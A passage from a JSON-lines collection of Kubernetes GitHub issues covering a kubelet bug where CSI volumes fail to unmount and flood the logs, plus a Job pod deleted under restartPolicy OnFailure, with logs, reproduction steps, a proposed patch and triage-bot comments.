"needs-triage"], "comments": [{"author": "neolit123", "body": "/sig apps\r\n"}, {"author": "harshap804", "body": "I am trying to fix some unit test on my local environement to test a fix for this. This is what I am trying to do:\r\n\r\nModified `updateDeployment` function, we first check if the deployment's spec has been updated by comparing the old and current specs. If the spec has been updated, we log the update, update the deployment's spec, set the `status.ObservedGeneration` to the current `metadata.Generation`, and update the deployment's status conditions based on the rollout progress. Finally, we enqueue the deployment for further processing.\r\n\r\n"}, {"author": "harshap804", "body": "And this is how I am doing it:\r\n\r\n```\r\nfunc (dc *DeploymentController) updateDeployment(logger klog.Logger, old, cur interface{}) {\r\n    oldD := old.(*apps.Deployment)\r\n    curD := cur.(*apps.Deployment)\r\n    if !reflect.DeepEqual(oldD.Spec, curD.Spec) {\r\n        logger.V(4).Info(\"Updating deployment\", \"deployment\", klog.KObj(oldD))\r\n        oldD.Spec = curD.Spec\r\n        oldD.Status.ObservedGeneration = curD.ObjectMeta.Generation\r\n        if oldD.Status.UpdatedReplicas == *oldD.Spec.Replicas {\r\n            oldD.Status.Conditions = []apps.DeploymentCondition{\r\n                {\r\n                    Type:   apps.DeploymentAvailable,\r\n                    Status: corev1.ConditionTrue,\r\n                },\r\n            }\r\n        } else {\r\n            oldD.Status.Conditions = []apps.DeploymentCondition{\r\n                {\r\n                    Type:   apps.DeploymentAvailable,\r\n                    Status: corev1.ConditionFalse,\r\n                },\r\n            }\r\n        }        \r\n        dc.enqueueDeployment(oldD)\r\n    }\r\n}\r\n```"}, {"author": "atiratree", "body": "/triage accepted\r\n/priority backlog"}, {"author": "atiratree", "body": "I can only reproduce this if the ReplicaSet with the new imaged existed before. If the new ReplicaSet does not exist, the progress is indicated immediately. \r\n\r\n@sicavz \r\nDoes this happen only in this case for you? Can you share a reproducer or your deployment?\r\n\r\nI think https://github.com/kubernetes/kubernetes/pull/124558 might fix it. Can you check if it helps?\r\n\r\n@harshap804 FYI, it is not a good idea to mutate the shared cache in the event handlers."}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124264#issuecomment-3324381040):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 116847, "issue_url": "https://github.com/kubernetes/kubernetes/issues/116847", "issue_title": "kubelet fails with `UnmountVolume.NewUnmounter failed for volume` and `vol_data.json: no such file or directory` for CSI volumes and floods the logs ", "issue_author": "vadasambar", "issue_body": "### What happened?\n\nI think kubelet sometimes is not able to properly identify unmounted volume and clean up its `actualstateofworld` cache. It thinks the volume is not unmounted and keeps on trying unmounting it. This outputs a lot of logs which flood journalctl -> fluentd/bit -> third party logging solution. The flooding causes 2 problems:\r\n1. Consumes node disk which reduces the amount of disk available for pods\r\n2. Increases ingestion rate for paid third party logging solution thereby costing extra money1 and 2 can be worked around by rotating the logs more frequently, dropping the logs or filtering them out from ingestion into the third party logging solution but it is not a permanent fix to the problem. Also, note that re-starting kubelet fixes the issue. Here's what the error log looks like:\r\n```\r\n\"Feb 13 22:05:35 ip-10-57-71-57 kubelet: E0213 22:05:35.753487   28558 reconciler.go:193] \\\"operationExecutor.UnmountVolume failed (controllerAttachDetachEnabled true) for volume \\\\\\\"drupal-code\\\\\\\" (UniqueName: \\\\\\\"kubernetes.io/csi/48033fa8-05f1-4c32-b109-4e25f23107ef-drupal-code\\\\\\\") pod \\\\\\\"48033fa8-05f1-4c32-b109-4e25f23107ef\\\\\\\" (UID: \\\\\\\"48033fa8-05f1-4c32-b109-4e25f23107ef\\\\\\\") : UnmountVolume.NewUnmounter failed for volume \\\\\\\"drupal-code\\\\\\\" (UniqueName: \\\\\\\"kubernetes.io/csi/48033fa8-05f1-4c32-b109-4e25f23107ef-drupal-code\\\\\\\") pod \\\\\\\"48033fa8-05f1-4c32-b109-4e25f23107ef\\\\\\\" (UID: \\\\\\\"48033fa8-05f1-4c32-b109-4e25f23107ef\\\\\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/48033fa8-05f1-4c32-b109-4e25f23107ef/volumes/kubernetes.io~csi/drupal-code/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/48033fa8-05f1-4c32-b109-4e25f23107ef/volumes/kubernetes.io~csi/drupal-code/vol_data.json]: open /var/lib/kubelet/pods/48033fa8-05f1-4c32-b109-4e25f23107ef/volumes/kubernetes.io~csi/drupal-code/vol_data.json: no such file or directory\\\" err=\\\"UnmountVolume.NewUnmounter failed for volume \\\\\\\"drupal-code\\\\\\\" (UniqueName: \\\\\\\"kubernetes.io/csi/48033fa8-05f1-4c32-b109-4e25f23107ef-drupal-code\\\\\\\") pod \\\\\\\"48033fa8-05f1-4c32-b109-4e25f23107ef\\\\\\\" (UID: \\\\\\\"48033fa8-05f1-4c32-b109-4e25f23107ef\\\\\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/48033fa8-05f1-4c32-b109-4e25f23107ef/volumes/kubernetes.io~csi/drupal-code/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/48033fa8-05f1-4c32-b109-4e25f23107ef/volumes/kubernetes.io~csi/drupal-code/vol_data.json]: open /var/lib/kubelet/pods/48033fa8-05f1-4c32-b109-4e25f23107ef/volumes/kubernetes.io~csi/drupal-code/vol_data.json: no such file or directory\\\"\r\n```\r\nIf you look at the code for 1.22, you can see the the log is output [here](https://github.com/kubernetes/kubernetes/blob/bc4763cbf8b9e6adfbc07bb3194509b187b0b901/pkg/kubelet/volumemanager/reconciler/reconciler.go#L191).\r\n\r\nCouple of things to note here: \r\n1. We have seen this happen a lot for short-lived pods. \r\n2. We have already looked at the following issues/PRs but they don't solve the problem\r\n   1. https://github.com/kubernetes/kubernetes/issues/101378\r\n   2. https://github.com/kubernetes/kubernetes/issues/101911\r\n   3. https://github.com/kubernetes/kubernetes/issues/85280\r\n   4. https://github.com/kubernetes/kubernetes/pull/102576 is ported back to 1.21 and 1.22 but it doesn't fix the problem\r\n3. We have seen this problem happen in 1.21 and 1.22 version of kubelet\r\n5. The volume is mounted using https://github.com/warm-metal/csi-driver-image\r\n6. Because kubelet thinks the volume is still mounted, it doesn't cleanly take out the pod. The Pod gets stuck in `Terminating` state because all the volumes attached the pod are not unmounted yet. \r\n7. Note that the directory structure of CSI volume is present. Only `vol_data.json` is absent\r\n![image](https://user-images.githubusercontent.com/34534103/226664453-426379c0-1d1c-46cf-8d73-2ba369b91b01.png)\n\n### What did you expect to happen?\n\nkubelet to not get stuck trying to unmount a volume\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nWe have tried reproducing this issue but it is quite difficult to reproduce manually. So far we have only been able to observe it in our logs after it has happened. \n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\r\n\r\n```console\r\n$ kubectl version\r\nClient Version: version.Info{Major:\"1\", Minor:\"23\", GitVersion:\"v1.23.1\", GitCommit:\"86ec240af8cbd1b60bcc4c03c20da9b98005b92e\", GitTreeState:\"clean\", BuildDate:\"2021-12-16T11:33:37Z\", GoVersion:\"go1.17.5\", Compiler:\"gc\", Platform:\"darwin/amd64\"}\r\nServer Version: version.Info{Major:\"1\", Minor:\"22+\", GitVersion:\"v1.22.16-eks-ffeb93d\", GitCommit:\"52e500d139bdef42fbc4540c357f0565c7867a81\", GitTreeState:\"clean\", BuildDate:\"2022-11-29T18:41:42Z\", GoVersion:\"go1.16.15\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n\r\n</details>\r\n\n\n### Cloud provider\n\n<details>\r\nAWS\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\nDocker\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\nCSI plugin: https://github.com/warm-metal/csi-driver-image\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/storage", "lifecycle/rotten", "triage/not-reproducible", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "vadasambar", "body": "Please let me know if you need more details \ud83d\ude4f "}, {"author": "kundan2707", "body": "/triage not-reproducible "}, {"author": "vadasambar", "body": "Note that when I say it's hard to reproduce manually, I mean it's hard to get into a state where `vol_data.json` is deleted automatically. You can easily reproduce the error message above using the following steps:\r\n1. Create a pod with CSI volume\r\n2. Log into the node and go to the pod directory e.g., `cd /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<vol-name>`\r\n3. Remove vol_data.json using `rm vol_data.json`\r\n4. You should start seeing the above error in kubelet logs"}, {"author": "HirazawaUi", "body": "/assign \r\ni'll have a look"}, {"author": "HirazawaUi", "body": "> Note that when I say it's hard to reproduce manually, I mean it's hard to get into a state where `vol_data.json` is deleted automatically. You can easily reproduce the error message above using the following steps:\r\n> \r\n> 1. Create a pod with CSI volume\r\n> 2. Log into the node and go to the pod directory e.g., `cd /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<vol-name>`\r\n> 3. Remove vol_data.json using `rm vol_data.json`\r\n> 4. You should start seeing the above error in kubelet logs\r\n\r\nI have reproduced this error in a local cluster running version 1.26.3 following the steps mentioned above. However, I am uncertain if this error will be triggered when kubelet is functioning normally. I will continue to monitor it. Starting from a particular issue may help to better understand the source code of kubelet :)"}, {"author": "vadasambar", "body": "Thank you for looking into this @HirazawaUi! "}, {"author": "HirazawaUi", "body": "@vadasambar It seems to have disappeared on v1.26.3. I used the CSI-Drive like you and implemented short code to create PV, PVC, and POD every two minutes, and then delete them after one minute when they are created (simulating a short-lived pod). Everything was fine after running continuously for two days. Could you test if this issue occurs on the new version? (if possible) "}, {"author": "vadasambar", "body": "@HirazawaUi thank you for looking deeper into this!\r\n\r\n>  I used the CSI-Drive like you and implemented short code to create PV, PVC, and POD every two minutes, and then delete them after one minute when they are created (simulating a short-lived pod). Everything was fine after running continuously for two days.\r\n\r\nI have tried something similar (CronJob which is set to run every minute with PV/PVC) on older Kubernetes version (1.21/1.22) but I wasn't able to reproduce this issue. It makes me think, something else might be involved here (perhaps a race condition?). "}, {"author": "HirazawaUi", "body": "> @HirazawaUi thank you for looking deeper into this!\r\n> \r\n> > I used the CSI-Drive like you and implemented short code to create PV, PVC, and POD every two minutes, and then delete them after one minute when they are created (simulating a short-lived pod). Everything was fine after running continuously for two days.\r\n> \r\n> I have tried something similar (CronJob which is set to run every minute with PV/PVC) on older Kubernetes version (1.21/1.22) but I wasn't able to reproduce this issue. It makes me think, something else might be involved here (perhaps a race condition?).\r\n\r\nI'm sorry, I wasn't able to solve your issue. Perhaps need to wait for someone who is more familiar with storage\r\n/unassign\r\n/sig storage"}, {"author": "vadasambar", "body": "@HirazawaUi not at all. Really appreciate you looking into this!"}, {"author": "qiliRedHat", "body": "@HirazawaUi @vadasambar I saw the similar issue too on Openshift OCP cluster https://issues.redhat.com/browse/OCPBUGS-11470\r\nVersion\r\n```\r\nServer Version: 4.13.0-rc.2\r\nKubernetes Version: v1.26.2+dc93b13\r\n\r\nand\r\n\r\nServer Version: 4.12.0\r\nKubernetes Version: v1.25.4+77bec7a\r\n```\r\nAWS with ebs.csi.aws.com csidriver\r\n```\r\n % oc get csidriver\r\nNAME              ATTACHREQUIRED   PODINFOONMOUNT   STORAGECAPACITY   TOKENREQUESTS   REQUIRESREPUBLISH   MODES        AGE\r\nebs.csi.aws.com   true             false            false             <unset>         false               Persistent   5d3h\r\n```\r\nHow can we reproduce it (as minimally and precisely as possible)?\r\nI encountered this in a long run test. The test have 15 concurrent users who create namespace, create pod and pvc under the namespace and then delete the namespace, continuously. The issue happened on about 4-5 days after I started the long run test. It happened very rarely, once or twice in a 5 days long run, which had totally 10k+ namespaces creation/deletion.\r\n\r\nThis bug is similar to a previous bug:\r\nhttps://bugzilla.redhat.com/show_bug.cgi?id=2038780\r\nhttps://github.com/kubernetes/kubernetes/pull/110670\r\n"}, {"author": "jsafrane", "body": "@cvvz, @Chaunceyctx, does it look like a duplicate of https://github.com/kubernetes/kubernetes/issues/114207 ? Or something very similar, now in SetUp / TearDown instead of MountDevice / UnmountDevice?\r\n"}, {"author": "Chaunceyctx", "body": "> @cvvz, @Chaunceyctx, does it look like a duplicate of #114207 ? Or something very similar, now in SetUp / TearDown instead of MountDevice / UnmountDevice?\r\n\r\nThese two problems look like similar. TearDown Operation may be performed multiple times. I will take a look if I have time LOL."}, {"author": "vadasambar", "body": "We checked some pods with unmount errors and Interestingly we are seeing `Orphaned pod found, but volumes are not cleaned up\" podUID=XXXX` log such pods. This might be due to parent getting removed abruptly. I wonder if the parent controller is removing the pods in a way it shouldn't or if kubelet is not responding well to such deletions. We have seen it happen with Job and ReplicaSets."}, {"author": "dims", "body": "cc @ConnorJC3 @torredil see references to `ebs.csi.aws.com csidriver` above"}, {"author": "cvvz", "body": "I think these two issues are the same, there is a TOCTOU problem and `vol.data` maybe removed multiple times which trigger this issue.\r\nWe have fixed this issue by skipping `UnmountDevice` when `vol_data.json` file does not exist,  since in this situation, `UnmountDevice` must has been executed successfully before, no need to do `UnmountDevice` multiple times."}, {"author": "jingxu97", "body": "/cc @jingxu97 "}, {"author": "vadasambar", "body": "@cvvz which release is this fixed in? (and thank you!)"}, {"author": "jingxu97", "body": "https://github.com/kubernetes/kubernetes/issues/114207#issuecomment-1535623925\r\n\r\nif it is the correct fix"}, {"author": "vadasambar", "body": "@jingxu97 thank you for the link. Looking [at the PR](https://github.com/kubernetes/kubernetes/pull/116138/files#diff-227f84916ffb93ece42ccaec840af8ea265714440c15c45f42b08d6a427a57bfR598-R600), I think the new change might resolve our issue. Thanks a bunch! "}, {"author": "vadasambar", "body": ">  FYI. this issue is fixed in 1.24.14, 1.25.10, 1.26.5, and has been fixed in v1.27.0\r\n\r\nhttps://github.com/kubernetes/kubernetes/issues/114207#issuecomment-1535623925"}, {"author": "Venkat639", "body": "Still getting same issue with k8s version 1.24.15. \r\nScenario I tried --\r\nCreate prometheus Statefulset pod but VPA updated resources for that pod and pod got immediately deleted within one minute of creation time.\r\nPod got stuck with in terminating state forever.\r\n\r\nFollowing are the logs --\r\n```\r\nJul 25 23:07:56 ip-x-x-x-x kubelet[6181]: E0725 23:07:56.957366    6181 nestedpendingoperations.go:348] Operation for \"{volumeName:kubernetes.io/csi/ebs.csi.aws.com^<vol-name> podName:<pod-name> nodeName:}\" failed. No retries permitted until 2023-07-25 23:07:57.457346569 +0000 UTC m=+153351.396529157 (durationBeforeRetry 500ms). Error: UnmountVolume.TearDown failed for volume \"storage-volume\" (UniqueName: \"kubernetes.io/csi/ebs.csi.aws.com^vol-xxxx\u201d) pod \"<pod-uid>\" (UID: \"<pod-uid>\") : kubernetes.io/csi: Unmounter.TearDownAt failed: rpc error: code = Internal desc = Could not unmount \"/var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/mount\": unmount failed: exit status 32\r\n\r\nJul 25 23:07:56 ip-x-x-x-x kubelet[6181]: Unmounting arguments: /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/mount\r\n\r\nJul 25 23:07:56 ip-x-x-x-x kubelet[6181]: Output: umount: /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/mount: no mount point specified. \r\n\r\nJul 25 23:07:57 ip-x-x-x-x kubelet[6181]: E0725 23:07:57.055425    6181 reconciler.go:208] \"operationExecutor.UnmountVolume failed (controllerAttachDetachEnabled true) for volume \\\"storage-volume\\\" (UniqueName: \\\"[kubernetes.io/csi/ebs.csi.aws.com^<vol-name>](http://kubernetes.io/csi/ebs.csi.aws.com%5Evol-xxxxx%5C)\u201d) pod \\\"<pod-uid>\\\" (UID: \\\"<pod-uid>\\\") : UnmountVolume.NewUnmounter failed for volume \\\"storage-volume\\\" (UniqueName: \\\"kubernetes.io/csi/ebs.csi.aws.com^<vol-name>\\\u201d) pod \\\"<pod-uid>\\\" (UID: \\\"<pod-uid>\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/vol_data.json]: open /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/vol_data.json: no such file or directory\" err=\"UnmountVolume.NewUnmounter failed for volume \\\"storage-volume\\\" (UniqueName: \\\"kubernetes.io/csi/ebs.csi.aws.com^<vol-name>\\\") pod \\\"<pod-uid>\\\" (UID: \\\"<pod-uid>\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/mount]: kubernetes.io/csi: failed to open volume data file [/var/lib/kubelet/pods/<pod-uid>volumes/kubernetes.io~csi/<pvc-id>/vol_data.json]: open /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~csi/<pvc-id>/vol_data.json: no such file or directory\"\r\n```"}, {"author": "cvvz", "body": "@Venkat639 This is not the same problem as what we fixed in https://github.com/kubernetes/kubernetes/pull/116138, we ~~fixed~~ workaround the race condition in `UnmountDevice`. However, this is another bug caused by the same race condition in `UnmountVolume` which is almost the same problem as what we have ~~fixed~~ workaround in `UnmountDevice` process and we need to fix this one as well. "}, {"author": "cvvz", "body": "I just filed a PR https://github.com/kubernetes/kubernetes/pull/120086 to resolve the race condition in reconciler, could you please take a look? @jingxu97 @jsafrane \r\n\r\nI think this is the real solution to this kind of problem. https://github.com/kubernetes/kubernetes/pull/116138 is just like some kind of workaround and not really solved the race condition problem."}, {"author": "Dunge", "body": "Got the same issue today randomly out of nowhere on a microk8s 1.27 cluster and lonhorn 1.5.1, so it's not fixed yet. The journalctl keep flooding this error every ms:\r\n\r\n> Sep 06 20:56:56 microk8s.daemon-kubelite[4155471]: E0906 20:56:56.044356 4155471 reconciler_common.go:169] \"operationExecutor.UnmountVolume failed (controllerAttachDetachEnabled true) for volume \\\"pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261\\\" (UniqueName: \\\"kubernetes.io/csi/driver.longhorn.io^pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261\\\") pod \\\"5fcddea2-77a4-475f-9a4c-a62f5243b353\\\" (UID: \\\"5fcddea2-77a4-475f-9a4c-a62f5243b353\\\") : UnmountVolume.NewUnmounter failed for volume \\\"pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261\\\" (UniqueName: \\\"kubernetes.io/csi/driver.longhorn.io^pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261\\\") pod \\\"5fcddea2-77a4-475f-9a4c-a62f5243b353\\\" (UID: \\\"5fcddea2-77a4-475f-9a4c-a62f5243b353\\\") : kubernetes.io/csi: unmounter failed to load volume data file [/var/snap/microk8s/common/var/lib/kubelet/pods/5fcddea2-77a4-475f-9a4c-a62f5243b353/volumes/kubernetes.io\\~csi/pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261/mount]: kubernetes.io/csi: failed to open volume data file [/var/snap/microk8s/common/var/lib/kubelet/pods/5fcddea2-77a4-475f-9a4c-a62f5243b353/volumes/kubernetes.io\\~csi/pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261/vol_data.json]: open /var/snap/microk8s/common/var/lib/kubelet/pods/5fcddea2-77a4-475f-9a4c-a62f5243b353/volumes/kubernetes.io~csi/pvc-ce65fb13-5ebf-4bd3-a202-b698de05c261/vol_data.json: no such file or directory\"\r\n\r\nI had a promotheus pod stuck in \"terminating\". I managed to force delete it but the errors continue. How to stop it?"}, {"author": "Dunge", "body": "Last week I deleted the pod folder manually and rebooted the node and it seemed to have stopped.\r\nThis morning it started again, this time on a different pod.\r\n\r\nRestarting just the kubelet process (microk8s stop/start in my case) seems to have fixed it, but I wouldn't want to error to break my cluster every few days?\r\n\r\nPlease advise."}, {"author": "gnufied", "body": "@Dunge thank you for reporting. Does the pod is stuck forever in `Terminating` state or did it clear soon?"}, {"author": "Dunge", "body": "It was stuck terminating (over 12h during the night) with the errors about `vol_data.json` spamming the journalctl logs and with the new replacement pod who couldn't mount the volume so the service was down.\r\nAfter issuing `microk8s stop` to shut down the node and the errors stopped in the console. I waited 5minutes for k8s to transfer the workload on the other pods. then it did clear up. I then restarted the node.\r\n\r\nMy interrogation is finding out what caused this in the first place, because two occurrences in less than a week is less than desirable. People are using the services on this cluster and their work was impacted."}, {"author": "gnufied", "body": "What is the kubelet version and can you capture kubelet log when this happens? I have found a way to reproduce this error - https://github.com/kubernetes/kubernetes/pull/120086#issuecomment-1718276990 but it does not prevent pod from being deleted and event spam eventually stops on its own. \r\n"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 74848, "issue_url": "https://github.com/kubernetes/kubernetes/issues/74848", "issue_title": "Pod is deleted after failed Job when used with \"restartPolicy: OnFailure\"", "issue_author": "r0bj", "issue_body": "<!-- Please use this template while reporting a bug and provide as much info as possible. Not doing so may result in your bug not being addressed in a timely manner. Thanks!\r\n\r\nIf the matter is security related, please disclose it privately via https://kubernetes.io/security/\r\n-->\r\n\r\n\r\n**What happened**:\r\n\r\nPod is deleted after failed Job when used with `restartPolicy: OnFailure`. So there is no way to eg. check for errors, debug logs.\r\n\r\n**What you expected to happen**:\r\n\r\nJob failed but Pod is still present to be able to check for errors, debug logs, etc.\r\n\r\n**How to reproduce it (as minimally and precisely as possible)**:\r\n\r\nCronJob manifest:\r\n```\r\napiVersion: batch/v1beta1\r\nkind: CronJob\r\nmetadata:\r\n  name: test\r\nspec:\r\n  schedule: \"*/10 * * * *\"\r\n  jobTemplate:\r\n    spec:\r\n      template:\r\n        spec:\r\n          restartPolicy: OnFailure\r\n          containers:\r\n          - name: cron-job\r\n            image: alpine\r\n            command:\r\n            - /bin/sh\r\n            - -c\r\n            - exit 1\r\n```\r\n\r\nJob events:\r\n```\r\nEvents:\r\n  Type     Reason                Age                From            Message\r\n  ----     ------                ----               ----            -------\r\n  Normal   SuccessfulCreate      5m56s              job-controller  Created pod: test-1551540600-kb4lm\r\n  Normal   SuccessfulDelete      10s                job-controller  Deleted pod: test-1551540600-kb4lm\r\n  Warning  BackoffLimitExceeded  10s (x2 over 10s)  job-controller  Job has reached the specified backoff limit\r\n```\r\n\r\nPod `test-1551540600-kb4lm` was deleted.\r\n\r\n**Anything else we need to know?**:\r\n\r\nUsing `restartPolicy: Never` works as expected - failed Pods are still available after failed Job.\r\n\r\n**Environment**:\r\n- Kubernetes version (use `kubectl version`):\r\n```\r\nClient Version: version.Info{Major:\"1\", Minor:\"13\", GitVersion:\"v1.13.3\", GitCommit:\"721bfa751924da8d1680787490c54b9179b1fed0\", GitTreeState:\"clean\", BuildDate:\"2019-02-04T04:48:03Z\", GoVersion:\"go1.11.5\", Compiler:\"gc\", Platform:\"darwin/amd64\"}\r\nServer Version: version.Info{Major:\"1\", Minor:\"12+\", GitVersion:\"v1.12.5-gke.5\", GitCommit:\"2c44750044d8aeeb6b51386ddb9c274ff0beb50b\", GitTreeState:\"clean\", BuildDate:\"2019-02-01T23:53:25Z\", GoVersion:\"go1.10.8b4\", Compiler:\"gc\", Platform:\"linux/amd64\"}\r\n```\r\n- Cloud provider or hardware configuration: GKE\r\n", "issue_labels": ["kind/bug", "sig/apps", "lifecycle/rotten"], "comments": [{"author": "r0bj", "body": "/sig apps"}, {"author": "Joseph-Irving", "body": "So I believe this is intended behaviour. The reason being that `backoffLimit` on a Job is not something the Pod knows about, so once your Pod has restarted 6 times (default) the job is failed but the Pod doesn't know to stop restarting its containers and would therefore continue on crashlooping forever, the Job controller deletes the pod to prevent it from doing this. \r\n\r\nSpecifically the Job controller deletes any active pods when the Job becomes failed, this is why you don't see pods getting deleted when using `RestartPolicy: Never`, these pods are no longer active so they don't need cleaning up.\r\n\r\nI'd always recommend having a logging pipeline in your cluster so that you have a persistent store of your logs for debugging, pod logs are always temporary. "}, {"author": "fejta-bot", "body": "Issues go stale after 90d of inactivity.\nMark the issue as fresh with `/remove-lifecycle stale`.\nStale issues rot after an additional 30d of inactivity and eventually close.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle stale"}, {"author": "fejta-bot", "body": "Stale issues rot after 30d of inactivity.\nMark the issue as fresh with `/remove-lifecycle rotten`.\nRotten issues close after an additional 30d of inactivity.\n\nIf this issue is safe to close now please do so with `/close`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/lifecycle rotten"}, {"author": "fejta-bot", "body": "Rotten issues close after 30d of inactivity.\nReopen the issue with `/reopen`.\nMark the issue as fresh with `/remove-lifecycle rotten`.\n\nSend feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n/close"}, {"author": "k8s-ci-robot", "body": "@fejta-bot: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/74848#issuecomment-522316916):\n\n>Rotten issues close after 30d of inactivity.\n>Reopen the issue with `/reopen`.\n>Mark the issue as fresh with `/remove-lifecycle rotten`.\n>\n>Send feedback to sig-testing, kubernetes/test-infra and/or [fejta](https://github.com/fejta).\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "deepaksood619", "body": "@Joseph-Irving Is there a way, where we can specify the pod that fail 6 times and then stop restarting. So we can get the logs from the 